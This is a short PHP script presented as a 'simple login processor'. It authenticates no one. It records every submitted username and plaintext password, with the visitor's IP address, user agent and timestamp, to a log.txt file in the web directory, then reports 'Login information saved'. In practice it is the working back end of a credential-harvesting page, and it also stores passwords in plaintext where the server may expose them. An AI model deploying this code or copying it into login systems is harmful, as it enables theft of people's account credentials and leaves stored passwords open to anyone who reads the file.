<?php
// Simple login processor that saves to log.txt
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $username = isset($_POST['username']) ? trim($_POST['username']) : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
    // Check if both fields are filled
    if (!empty($username) && !empty($password)) {
        // Create log entry
        $timestamp = date('Y-m-d H:i:s');
        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        
        // Format: timestamp | ip | username | password | user_agent
        $logEntry = sprintf(
            "[%s] IP: %s | Username: %s | Password: %s | Agent: %s\n",
            $timestamp,
            $ip,
            $username,
            $password,
            $userAgent
        );
        
        // Save to log.txt file
        $file = 'log.txt';
        
        // Create file if doesn't exist
        if (!file_exists($file)) {
            file_put_contents($file, "=== Login Log ===\n\n");
        }
        
        // Append log entry
        if (file_put_contents($file, $logEntry, FILE_APPEND | LOCK_EX)) {
            // Redirect back with success message
            header('Location: index.html?message=' . urlencode('Login information saved') . '&type=success');
        } else {
            // Redirect back with error
            header('Location: index.html?message=' . urlencode('Error saving log') . '&type=error');
        }
        exit();
    } else {
        // Empty fields
        header('Location: index.html?message=' . urlencode('Please fill all fields') . '&type=error');
        exit();
    }
} else {
    // Not a POST request
    header('Location: index.html');
    exit();
}
?>